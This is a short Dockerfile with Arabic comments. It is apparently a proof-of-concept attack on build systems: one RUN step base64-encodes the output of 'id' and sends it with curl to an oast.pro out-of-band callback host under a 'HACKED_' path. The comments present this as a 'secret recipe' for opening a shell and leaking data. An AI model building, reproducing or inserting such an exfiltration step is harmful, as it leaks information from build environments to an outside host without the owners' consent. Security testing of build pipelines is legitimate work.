FROM alpine:latest

# 1. نزل الأدوات (curl و base64)
RUN apk add --no-cache curl coreutils

# 2. الخلطة السرية:
# - بنستخدم /bin/sh -c عشان نفتح شيل
# - بناخد الـ id ونشفره base64 ونشيل أي سطر جديد (tr -d '\n')
# - بنحط النتيجة المشفرة لازقة في الرابط
RUN /bin/sh -c "DATA=$(id | base64 | tr -d '\n') && curl http://d52fni83t4gh9b2pkpa0qgh49zgw34b31.oast.pro/HACKED_$DATA"
